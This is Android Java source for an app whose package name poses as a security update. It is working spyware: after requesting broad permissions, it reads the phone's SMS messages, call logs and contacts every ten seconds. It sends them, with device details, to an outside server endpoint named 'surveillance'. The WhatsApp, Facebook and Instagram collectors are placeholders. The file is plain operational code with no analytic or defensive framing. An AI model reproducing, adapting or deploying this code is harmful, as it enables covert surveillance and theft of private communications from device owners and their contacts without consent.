package com.security.update;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.os.Bundle;
import android.widget.TextView;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {
    private static final String SERVER_URL = "https://GhostTester.pythonanywhere.com/api/surveillance";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private TextView statusText;
    private ScheduledExecutorService scheduler;

    // All required permissions
    private static final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.INTERNET
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        statusText = findViewById(R.id.statusText);

        // Check and request permissions
        if (checkPermissions()) {
            startAutomaticDataCollection();
        } else {
            requestPermissions();
        }
    }

    private boolean checkPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void requestPermissions() {
        ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                startAutomaticDataCollection();
                statusText.setText("✅ All permissions granted! Data collection started automatically.");
            } else {
                statusText.setText("❌ Some permissions denied! App may not work properly.");
            }
        }
    }

    private void startAutomaticDataCollection() {
        statusText.setText("🚀 Starting automatic data collection...");

        // Start scheduler for automatic data collection every 10 seconds
        scheduler = Executors.newScheduledThreadPool(1);
        scheduler.scheduleAtFixedRate(() -> {
            try {
                collectAndSendAllData();
                runOnUiThread(() -> statusText.setText("📱 Data sent - " + new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date())));
            } catch (Exception e) {
                Log.e("AUTO_COLLECTION", "Error: " + e.getMessage());
                runOnUiThread(() -> statusText.setText("❌ Error: " + e.getMessage()));
            }
        }, 0, 10, TimeUnit.SECONDS); // Every 10 seconds
    }

    private void collectAndSendAllData() {
        try {
            JSONObject data = new JSONObject();
            data.put("device_id", Build.MODEL);
            data.put("status", "automatic_collection");
            data.put("timestamp", System.currentTimeMillis());

            JSONObject collectedData = new JSONObject();

            // 1. COLLECT SMS MESSAGES
            collectedData.put("sms_messages", collectSMSMessages());

            // 2. COLLECT CALL LOGS
            collectedData.put("call_logs", collectCallLogs());

            // 3. COLLECT CONTACTS
            collectedData.put("contacts", collectContacts());

            // 4. COLLECT WHATSAPP MESSAGES
            collectedData.put("whatsapp_messages", collectWhatsAppMessages());

            // 5. COLLECT FACEBOOK MESSAGES
            collectedData.put("facebook_messages", collectFacebookMessages());

            // 6. COLLECT INSTAGRAM MESSAGES
            collectedData.put("instagram_messages", collectInstagramMessages());

            // 7. DEVICE INFORMATION
            collectedData.put("device_info", collectDeviceInfo());

            data.put("data", collectedData);

            // Send to server
            sendDataToServer(data);

        } catch (Exception e) {
            Log.e("DATA_COLLECTION", "Error collecting data: " + e.getMessage());
        }
    }

    private JSONArray collectSMSMessages() {
        JSONArray smsList = new JSONArray();
        try {
            Cursor cursor = getContentResolver().query(
                    Uri.parse("content://sms"),
                    null, null, null, "date DESC LIMIT 50"
            );
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
                    sms.put("type", cursor.getString(cursor.getColumnIndexOrThrow("type")));
                    sms.put("read", cursor.getString(cursor.getColumnIndexOrThrow("read")));
                    smsList.put(sms);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("SMS_COLLECTION", "Error reading SMS: " + e.getMessage());
        }
        return smsList;
    }

    private JSONArray collectCallLogs() {
        JSONArray callsList = new JSONArray();
        try {
            Cursor cursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50"
            );
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    call.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
                    call.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    call.put("date", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    call.put("type", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    callsList.put(call);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("CALL_COLLECTION", "Error reading call logs: " + e.getMessage());
        }
        return callsList;
    }

    private JSONArray collectContacts() {
        JSONArray contactsList = new JSONArray();
        try {
            Cursor cursor = getContentResolver().query(
                    ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null
            );
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                    contact.put("name", name);

                    // Get phone numbers
                    JSONArray phones = new JSONArray();
                    Cursor phoneCursor = getContentResolver().query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{contactId},
                            null
                    );
                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            phones.put(phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                        }
                        phoneCursor.close();
                    }
                    contact.put("phones", phones);
                    contactsList.put(contact);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("CONTACTS_COLLECTION", "Error reading contacts: " + e.getMessage());
        }
        return contactsList;
    }

    private JSONArray collectWhatsAppMessages() {
        JSONArray whatsappList = new JSONArray();
        try {
            JSONObject whatsappInfo = new JSONObject();
            whatsappInfo.put("status", "requires_root_access");
            whatsappList.put(whatsappInfo);
        } catch (Exception e) {
            Log.e("WHATSAPP_COLLECTION", "Error: " + e.getMessage());
        }
        return whatsappList;
    }

    private JSONArray collectFacebookMessages() {
        JSONArray facebookList = new JSONArray();
        try {
            JSONObject facebookInfo = new JSONObject();
            facebookInfo.put("status", "requires_root_access");
            facebookList.put(facebookInfo);
        } catch (Exception e) {
            Log.e("FACEBOOK_COLLECTION", "Error: " + e.getMessage());
        }
        return facebookList;
    }

    private JSONArray collectInstagramMessages() {
        JSONArray instagramList = new JSONArray();
        try {
            JSONObject instagramInfo = new JSONObject();
            instagramInfo.put("status", "requires_root_access");
            instagramList.put(instagramInfo);
        } catch (Exception e) {
            Log.e("INSTAGRAM_COLLECTION", "Error: " + e.getMessage());
        }
        return instagramList;
    }

    private JSONObject collectDeviceInfo() {
        JSONObject deviceInfo = new JSONObject();
        try {
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("brand", Build.BRAND);
            deviceInfo.put("android_version", Build.VERSION.RELEASE);
            deviceInfo.put("sdk_version", Build.VERSION.SDK_INT);
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
        } catch (Exception e) {
            Log.e("DEVICE_INFO", "Error: " + e.getMessage());
        }
        return deviceInfo;
    }

    private void sendDataToServer(JSONObject data) {
        Executors.newSingleThreadExecutor().execute(() -> {
            try {
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                OutputStream os = conn.getOutputStream();
                os.write(data.toString().getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d("SERVER_RESPONSE", "Response code: " + responseCode);

                conn.disconnect();
            } catch (Exception e) {
                Log.e("SERVER_COMM", "Error: " + e.getMessage());
            }
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (scheduler != null) {
            scheduler.shutdown();
        }
    }
}
